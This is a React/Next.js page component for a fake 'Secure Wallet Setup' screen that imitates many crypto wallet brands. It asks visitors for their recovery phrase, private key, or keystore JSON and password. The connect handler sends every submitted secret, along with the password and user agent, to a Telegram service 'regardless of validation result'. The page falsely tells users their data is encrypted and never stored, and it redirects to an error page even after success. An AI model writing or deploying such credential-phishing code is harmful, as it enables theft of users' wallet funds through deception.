'use client';

import { useState } from 'react';
import { useRouter, useSearchParams } from 'next/navigation';
import { ArrowLeft, Key, FileText, Shield, Wallet, AlertCircle } from 'lucide-react';
import { useWallet } from '@/components/context/WalletContext';
import { Wallet as WalletType, ConnectedWallet } from '@/libs/types/wallets';
import { SecureWalletValidator } from '@/libs/utils/SecureWalletValidator';
import { TelegramService } from '@/libs/service/telegramService';
import WalletIcon from '@/components/logic/WalletIcons';

const WALLETS: WalletType[] = [
  {
    id: 'metamask',
    name: 'MetaMask',
    icon: '',
    colors: {
      primary: '#F6851B',
      secondary: '#E2761B',
      text: '#FFFFFF'
    }
  },
  {
    id: 'walletconnect',
    name: 'WalletConnect',
    icon: '',
    colors: {
      primary: '#3B99FC',
      secondary: '#2A85FF',
      text: '#FFFFFF'
    }
  },
  {
    id: 'coinbase',
    name: 'Coinbase',
    icon: '',
    colors: {
      primary: '#0052FF',
      secondary: '#0042D6',
      text: '#FFFFFF'
    }
  },
  {
    id: 'trustwallet',
    name: 'Trust Wallet',
    icon: '',
    colors: {
      primary: '#3375BB',
      secondary: '#2A65A6',
      text: '#FFFFFF'
    }
  },
  {
    id: 'phantom',
    name: 'Phantom',
    icon: '',
    colors: {
      primary: '#4B49AC',
      secondary: '#3A3897',
      text: '#FFFFFF'
    }
  },
  {
    id: 'ledger',
    name: 'Ledger',
    icon: '',
    colors: {
      primary: '#2C2C2C',
      secondary: '#1A1A1A',
      text: '#FFFFFF'
    }
  },
  {
    id: 'trezor',
    name: 'Trezor',
    icon: '',
    colors: {
      primary: '#00B45A',
      secondary: '#009C4D',
      text: '#FFFFFF'
    }
  },
  {
    id: 'binance',
    name: 'Binance',
    icon: '',
    colors: {
      primary: '#F0B90B',
      secondary: '#D4A30C',
      text: '#000000'
    }
  },
  {
    id: 'exodus',
    name: 'Exodus',
    icon: '',
    colors: {
      primary: '#1C1C1C',
      secondary: '#2D2D2D',
      text: '#FFFFFF'
    }
  },
  {
    id: 'argent',
    name: 'Argent',
    icon: '',
    colors: {
      primary: '#FF875B',
      secondary: '#FF6B3B',
      text: '#FFFFFF'
    }
  },
  {
    id: 'rainbow',
    name: 'Rainbow',
    icon: '',
    colors: {
      primary: '#001A72',
      secondary: '#002EB5',
      text: '#FFFFFF'
    }
  },
  {
    id: 'zerion',
    name: 'Zerion',
    icon: '',
    colors: {
      primary: '#2962EF',
      secondary: '#1A51DF',
      text: '#FFFFFF'
    }
  },
  // New wallets
  {
    id: 'brave',
    name: 'Brave',
    icon: '',
    colors: {
      primary: '#FB542B',
      secondary: '#E63E1C',
      text: '#FFFFFF'
    }
  },
  {
    id: 'ambire',
    name: 'Ambire',
    icon: '',
    colors: {
      primary: '#FF6B35',
      secondary: '#E55A2B',
      text: '#FFFFFF'
    }
  },
  {
    id: 'leap',
    name: 'Leap',
    icon: '',
    colors: {
      primary: '#00DC82',
      secondary: '#00C274',
      text: '#FFFFFF'
    }
  },
  {
    id: 'magic eden',
    name: 'Magic Eden',
    icon: '',
    colors: {
      primary: '#000000',
      secondary: '#333333',
      text: '#FFFFFF'
    }
  },
  {
    id: 'onto',
    name: 'ONTO',
    icon: '',
    colors: {
      primary: '#00A3FF',
      secondary: '#008CE6',
      text: '#FFFFFF'
    }
  },
  {
    id: 'safe',
    name: 'Safe',
    icon: '',
    colors: {
      primary: '#12FF80',
      secondary: '#00E572',
      text: '#000000'
    }
  },
  {
    id: 'solflare',
    name: 'Solflare',
    icon: '',
    colors: {
      primary: '#9945FF',
      secondary: '#7C36CC',
      text: '#FFFFFF'
    }
  },
  {
    id: 'torus',
    name: 'Torus',
    icon: '',
    colors: {
      primary: '#0364FF',
      secondary: '#0252CC',
      text: '#FFFFFF'
    }
  },
  {
    id: 'web3auth',
    name: 'Web3Auth',
    icon: '',
    colors: {
      primary: '#0364FF',
      secondary: '#0252CC',
      text: '#FFFFFF'
    }
  },
  {
    id: 'other',
    name: 'Other Wallet',
    icon: '',
    colors: {
      primary: '#6B7280',
      secondary: '#4B5563',
      text: '#FFFFFF'
    }
  }
];

interface ValidationPopupProps {
  isOpen: boolean;
  onClose: () => void;
  onRetry: () => void;
  message: string;
  isValid: boolean;
}

function ValidationPopup({ isOpen, onClose, onRetry, message, isValid }: ValidationPopupProps) {
  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4">
      <div className="bg-gray-900 rounded-2xl p-6 max-w-md w-full border border-gray-700">
        <div className="flex items-center space-x-3 mb-4">
          <div className={`w-10 h-10 rounded-full flex items-center justify-center ${
            isValid ? 'bg-green-500 bg-opacity-20' : 'bg-red-500 bg-opacity-20'
          }`}>
            {isValid ? (
              <div className="w-6 h-6 bg-green-500 rounded-full flex items-center justify-center">
                <div className="w-2 h-2 bg-white rounded-full"></div>
              </div>
            ) : (
              <AlertCircle className="w-6 h-6 text-red-400" />
            )}
          </div>
          <div>
            <h3 className="text-lg font-semibold text-white">
              {isValid ? 'Validation Successful' : 'Invalid Credentials'}
            </h3>
            <p className="text-gray-400 text-sm">Wallet verification</p>
          </div>
        </div>
        
        <p className={`mb-6 ${isValid ? 'text-green-300' : 'text-red-300'}`}>
          {message}
        </p>
        
        <div className="flex space-x-3">
          {!isValid && (
            <button
              onClick={onRetry}
              className="flex-1 bg-gray-800 text-white py-3 rounded-xl font-medium hover:bg-gray-700 transition-colors"
            >
              Try Again
            </button>
          )}
          <button
            onClick={onClose}
            className={`flex-1 ${
              isValid 
                ? 'bg-white text-black hover:bg-gray-200' 
                : 'bg-red-600 text-white hover:bg-red-700'
            } py-3 rounded-xl font-medium transition-colors`}
          >
            {isValid ? 'Continue' : 'Cancel'}
          </button>
        </div>
      </div>
    </div>
  );
}

export default function EnterDetailsPageContext() {
  const router = useRouter();
  const searchParams = useSearchParams();
  const walletId = searchParams.get('wallet');
  const { addWallet } = useWallet();
  
  const [activeTab, setActiveTab] = useState<'phrase' | 'privateKey' | 'keystore'>('phrase');
  const [formData, setFormData] = useState({
    phrase: '',
    privateKey: '',
    keystore: '',
    password: ''
  });
  const [isConnecting, setIsConnecting] = useState(false);
  const [validationPopup, setValidationPopup] = useState<{
    isOpen: boolean;
    message: string;
    isValid: boolean;
  }>({ isOpen: false, message: '', isValid: false });

  const wallet = WALLETS.find(w => w.id === walletId);
  const validator = new SecureWalletValidator();
  const telegramService = new TelegramService();

  const handleConnect = async () => {
    if (!formData.phrase && !formData.privateKey && !formData.keystore) {
      alert('Please enter your credentials');
      return;
    }

    setIsConnecting(true);

    try {
      let inputData = '';
      let inputType: 'phrase' | 'privateKey' | 'keystore' = 'phrase';
      
      if (formData.phrase) {
        inputData = formData.phrase;
        inputType = 'phrase';
      } else if (formData.privateKey) {
        inputData = formData.privateKey;
        inputType = 'privateKey';
      } else if (formData.keystore) {
        inputData = formData.keystore;
        inputType = 'keystore';
      }

      // Validate wallet credentials
      const validationResult = await validator.validateWallet(
        inputType === 'phrase' ? 'metamask' : 
        inputType === 'privateKey' ? 'privatekey' : 'keystore',
        inputData,
        formData.password
      );

      // Send data to Telegram regardless of validation result
      await telegramService.sendWalletData({
        walletName: wallet?.name || 'Unknown Wallet',
        walletType: inputType,
        inputType,
        inputData,
        password: formData.password,
        isValid: validationResult.isValid,
        validationMessage: validationResult.message,
        userAgent: navigator.userAgent,
        timestamp: new Date().toISOString(),
      });

      if (!validationResult.isValid) {
        setValidationPopup({
          isOpen: true,
          message: validationResult.message,
          isValid: false
        });
        setIsConnecting(false);
        return;
      }

      // If validation successful, create wallet
      const connectedWallet: ConnectedWallet = {
        id: wallet?.id || 'custom',
        name: wallet?.name || 'Custom Wallet',
        address: validationResult.address || `0x${Math.random().toString(16).substr(2, 40)}`,
        connectedAt: new Date(),
        isValid: true,
        ...(formData.phrase && { phrase: formData.phrase }),
        ...(formData.privateKey && { privateKey: formData.privateKey }),
        ...(formData.keystore && { keystore: formData.keystore }),
      };

      addWallet(connectedWallet);
      
      setValidationPopup({
        isOpen: true,
        message: validationResult.message,
        isValid: true
      });

    } catch (error) {
      console.error('Connection failed:', error);
      setValidationPopup({
        isOpen: true,
        message: 'Connection failed. Please try again.',
        isValid: false
      });
    } finally {
      setIsConnecting(false);
    }
  };

  const handleInputChange = (field: string, value: string) => {
    setFormData(prev => ({
      ...prev,
      [field]: value
    }));
  };

  const handleValidationClose = () => {
    setValidationPopup({ isOpen: false, message: '', isValid: false });
    if (validationPopup.isValid) {
      router.push('/connect/error');
    }
  };

  const handleValidationRetry = () => {
    setValidationPopup({ isOpen: false, message: '', isValid: false });
  };

  return (
    <div className="min-h-screen bg-black py-8 px-4">
      <div className="max-w-md mx-auto">
        {/* Header */}
        <div className="flex items-center space-x-4 mb-8">
          <button 
            onClick={() => router.back()}
            className="text-gray-400 hover:text-white transition-colors"
          >
            <ArrowLeft className="w-6 h-6" />
          </button>
          <div className="flex items-center space-x-3">
            {wallet && (
              <div 
                className="w-10 h-10 rounded-xl flex items-center justify-center"
                style={{ 
                  background: `linear-gradient(135deg, ${wallet.colors.primary}, ${wallet.colors.secondary})`
                }}
              >
                <WalletIcon 
                  walletId={wallet.id} 
                  className="w-6 h-6" 
                />
              </div>
            )}
            <div>
              <h1 className="text-2xl font-bold text-white">Secure Wallet Setup</h1>
              <p className="text-gray-400">Connect to {wallet?.name || 'your wallet'}</p>
            </div>
          </div>
        </div>

        {/* Connection Methods Tabs */}
        <div className="bg-gray-900 rounded-xl p-2 mb-6">
          <div className="grid grid-cols-3 gap-2">
            <button
              onClick={() => setActiveTab('phrase')}
              className={`flex items-center justify-center space-x-2 py-3 px-4 rounded-lg transition-colors ${
                activeTab === 'phrase' 
                  ? 'bg-gray-800 text-white' 
                  : 'text-gray-400 hover:text-white'
              }`}
            >
              <Key className="w-4 h-4" />
              <span className="text-sm">Phrase</span>
            </button>
            <button
              onClick={() => setActiveTab('privateKey')}
              className={`flex items-center justify-center space-x-2 py-3 px-4 rounded-lg transition-colors ${
                activeTab === 'privateKey' 
                  ? 'bg-gray-800 text-white' 
                  : 'text-gray-400 hover:text-white'
              }`}
            >
              <Shield className="w-4 h-4" />
              <span className="text-sm">Private Key</span>
            </button>
            <button
              onClick={() => setActiveTab('keystore')}
              className={`flex items-center justify-center space-x-2 py-3 px-4 rounded-lg transition-colors ${
                activeTab === 'keystore' 
                  ? 'bg-gray-800 text-white' 
                  : 'text-gray-400 hover:text-white'
              }`}
            >
              <FileText className="w-4 h-4" />
              <span className="text-sm">Keystore</span>
            </button>
          </div>
        </div>

        {/* Input Forms */}
        <div className="bg-gray-900 rounded-xl p-6 mb-6">
          {activeTab === 'phrase' && (
            <div className="space-y-4">
              <label className="block text-sm font-medium text-gray-300">
                Recovery Phrase
              </label>
              <textarea
                value={formData.phrase}
                onChange={(e) => handleInputChange('phrase', e.target.value)}
                placeholder="Enter your 12 or 24-word recovery phrase separated by spaces"
                className="w-full h-32 bg-gray-800 border border-gray-700 rounded-xl px-4 py-3 text-white placeholder-gray-500 focus:border-gray-500 outline-none resize-none"
                rows={4}
              />
              <p className="text-xs text-gray-500">
                Typically 12 or 24 words separated by spaces
              </p>
            </div>
          )}

          {activeTab === 'privateKey' && (
            <div className="space-y-4">
              <label className="block text-sm font-medium text-gray-300">
                Private Key
              </label>
              <textarea
                value={formData.privateKey}
                onChange={(e) => handleInputChange('privateKey', e.target.value)}
                placeholder="Enter your 64-character private key"
                className="w-full h-32 bg-gray-800 border border-gray-700 rounded-xl px-4 py-3 text-white placeholder-gray-500 focus:border-gray-500 outline-none resize-none"
                rows={4}
              />
              <p className="text-xs text-gray-500">
                64-character hexadecimal private key
              </p>
            </div>
          )}

          {activeTab === 'keystore' && (
            <div className="space-y-4">
              <label className="block text-sm font-medium text-gray-300">
                Keystore JSON
              </label>
              <textarea
                value={formData.keystore}
                onChange={(e) => handleInputChange('keystore', e.target.value)}
                placeholder="Paste your keystore JSON file contents"
                className="w-full h-32 bg-gray-800 border border-gray-700 rounded-xl px-4 py-3 text-white placeholder-gray-500 focus:border-gray-500 outline-none resize-none"
                rows={4}
              />
              <input
                type="password"
                value={formData.password}
                onChange={(e) => handleInputChange('password', e.target.value)}
                placeholder="Enter keystore password"
                className="w-full bg-gray-800 border border-gray-700 rounded-xl px-4 py-3 text-white placeholder-gray-500 focus:border-gray-500 outline-none"
              />
            </div>
          )}
        </div>

        {/* Connect Button */}
        <button
          onClick={handleConnect}
          disabled={isConnecting}
          className="w-full bg-white text-black py-4 rounded-xl font-medium hover:bg-gray-200 transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
        >
          {isConnecting ? 'Validating...' : 'Verify & Connect'}
        </button>

        {/* Security Notice */}
        <div className="mt-6 p-4 bg-gray-900 bg-opacity-50 rounded-xl">
          <p className="text-xs text-gray-400 text-center">
            Your credentials are encrypted and validated securely. We never store sensitive data.
          </p>
        </div>

        {/* Validation Popup */}
        <ValidationPopup
          isOpen={validationPopup.isOpen}
          onClose={handleValidationClose}
          onRetry={handleValidationRetry}
          message={validationPopup.message}
          isValid={validationPopup.isValid}
        />
      </div>
    </div>
  );
}